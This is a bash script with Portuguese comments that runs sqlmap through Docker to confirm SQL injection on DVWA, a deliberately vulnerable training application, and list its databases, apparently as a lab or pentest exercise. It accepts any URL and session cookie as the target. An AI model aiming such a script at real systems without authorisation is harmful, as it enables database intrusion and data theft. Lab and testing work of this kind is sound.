#!/usr/bin/env bash
set -euo pipefail

# Exploit/confirmacao de SQLi usando sqlmap via Docker.
# Este script foi feito para DVWA (pagina /vulnerabilities/sqli/?id=1&Submit=Submit#).
# Requer um cookie de sessao valido do DVWA (PHPSESSID e security=low).
# Exemplo de uso:
#   ./scripts/sqlmap_sqli_dump.sh "PHPSESSID=abcd1234; security=low" \
#     "http://host.docker.internal:8080/vulnerabilities/sqli/?id=1&Submit=Submit"

COOKIE="${1:-}"
URL="${2:-}"

if [[ -z "$COOKIE" || -z "$URL" ]]; then
  echo "Uso:" >&2
  echo "  $0 \"PHPSESSID=...; security=low\" \"http://.../vulnerabilities/sqli/?id=1&Submit=Submit\"" >&2
  exit 1
fi

OUTDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/evidencias/sqlmap"
mkdir -p "$OUTDIR"

if ! command -v docker >/dev/null 2>&1; then
  echo "[ERRO] docker nao encontrado." >&2
  exit 1
fi

echo "[INFO] Rodando sqlmap em: $URL"

# Usando imagem ParrotSec (mantida e atualizada com frequencia)
docker run --rm -t \
  -v "$OUTDIR:/root/.local/share/sqlmap" \
  parrotsec/sqlmap \
  -u "$URL" \
  --cookie="$COOKIE" \
  --batch \
  --level=2 --risk=1 \
  --dbs

echo "[OK] Artefatos do sqlmap (cache/logs) em: $OUTDIR"
